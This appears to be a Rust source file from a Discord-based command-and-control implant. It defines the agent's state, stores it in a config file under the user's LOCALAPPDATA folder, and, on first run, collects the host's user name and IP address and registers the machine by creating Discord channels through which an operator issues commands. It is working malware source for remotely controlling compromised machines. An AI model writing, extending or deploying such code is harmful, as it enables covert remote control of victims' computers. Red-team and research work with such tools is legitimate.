use serde::{Deserialize, Serialize};
use serenity::client::Context;
use serenity::model::id::ChannelId;
use std::io::{Read, Write};
use std::{
    env, fmt,
    fs::{File, OpenOptions},
    path::Path,
};

use crate::errors::DiscordC2Error;
use crate::os::recon::{ip, user};
use crate::utils::channels::{create_category_channel, create_text_channel};

#[derive(Serialize, Deserialize)]
pub struct Agent {
    category_channel: ChannelId,
    command_channel: ChannelId,
    hostname_user: String,
    ip_address: String,
    session_channel: Option<ChannelId>,
}

impl Agent {
    pub fn new(
        category_channel: ChannelId,
        command_channel: ChannelId,
        hostname_user: String,
        ip_address: String,
    ) -> Result<Agent, DiscordC2Error> {
        let agent = Agent {
            category_channel,
            command_channel,
            hostname_user: hostname_user.to_string(),
            ip_address: ip_address.to_string(),
            session_channel: None,
        };
        agent.write()?;
        Ok(agent)
    }

    pub fn load() -> Result<Agent, DiscordC2Error> {
        // Load the file or throw an error
        let mut file = get_config()?;

        // Read the contents of the file
        let mut config_data = String::new();
        file.read_to_string(&mut config_data).map_err(|err| {
            println!("Error reading config file: {}", err);
            DiscordC2Error::from(err)
        })?;

        // Deserialize the JSON data into an Agent object
        let agent = serde_json::from_str(&config_data)
            .map_err(|err| DiscordC2Error::AgentError(err.to_string()))?;

        Ok(agent)
    }

    fn write(&self) -> Result<(), DiscordC2Error> {
        // Open the config file for writing
        let mut file = get_config()?;

        // Truncate the file to 0 bytes (this fixes the JSON parser error where session go from epoch's to null)
        file.set_len(0).map_err(|err| DiscordC2Error::from(err))?;

        // Serialize the Agent object to JSON
        let agent_json = serde_json::to_string(&self)
            .map_err(|err| DiscordC2Error::AgentError(err.to_string()))?;

        // Write the JSON data to the file
        file.write_all(agent_json.as_bytes())
            .map_err(|err| DiscordC2Error::from(err))?;

        Ok(())
    }

    /* Getters */
    pub fn get_category_channel(&self) -> &ChannelId {
        &self.category_channel
    }

    pub fn get_command_channel(&self) -> &ChannelId {
        &self.command_channel
    }

    pub fn get_ip_address(&self) -> &str {
        &self.ip_address
    }

    pub fn get_session_channel(&self) -> &Option<ChannelId> {
        &self.session_channel
    }
    /* Getters */

    /* Setters */
    pub fn set_session_channel(
        &mut self,
        session_channel: Option<ChannelId>,
    ) -> Result<(), DiscordC2Error> {
        self.session_channel = session_channel;
        self.write()
    }
    /* Setters */
}

impl fmt::Display for Agent {
    fn fmt(&self, f: &mut fmt::Formatter) -> fmt::Result {
        write!(
            f,
            "Agent {{ category_channel: {}, commands_channel: {} hostname_user: {:?}, ip_address: {:?} }}",
            self.category_channel, self.command_channel, self.hostname_user, self.ip_address
        )
    }
}

// Helper method for getting the config file pointer
fn get_config() -> Result<File, DiscordC2Error> {
    // Get all the config directory paths
    let app_data_dir =
        env::var("LOCALAPPDATA").map_err(|err| DiscordC2Error::ConfigError(err.to_string()))?;
    let config_dir = Path::new(&app_data_dir);
    let file_path = config_dir.join("config.txt");

    // Create the config file and return the File, or return the File if it doesn't exist
    let file = OpenOptions::new()
        .read(true)
        .write(true)
        .create(true)
        .open(&file_path)
        .map_err(|err| DiscordC2Error::from(err))?;

    Ok(file)
}

// Public helper method to either load the agent or create a new one assuming it doesn't exist (or there was an error)
pub async fn get_or_create_agent(ctx: &Context) -> Agent {
    match Agent::load() {
        Ok(agent) => agent,
        Err(why) => {
            // Find the hostname/IP of our agent
            let (hostname, ip) = (user(), ip().await.unwrap());

            // Create the channels
            let category_id = create_category_channel(&ctx, format!("{} - {}", hostname, ip))
                .await
                .unwrap(); // TODO: Better error handling
            let command_id = create_text_channel(
                &ctx,
                "commands",
                &category_id,
                "This is the central command center for your agent. Run some slash commands here!",
            )
            .await
            .unwrap(); // TODO: Better error handling
            println!("Agent created: {}", why);

            // Instantiate the agent
            let agent = Agent::new(category_id, command_id, hostname, ip);
            agent.unwrap()
        }
    }
}
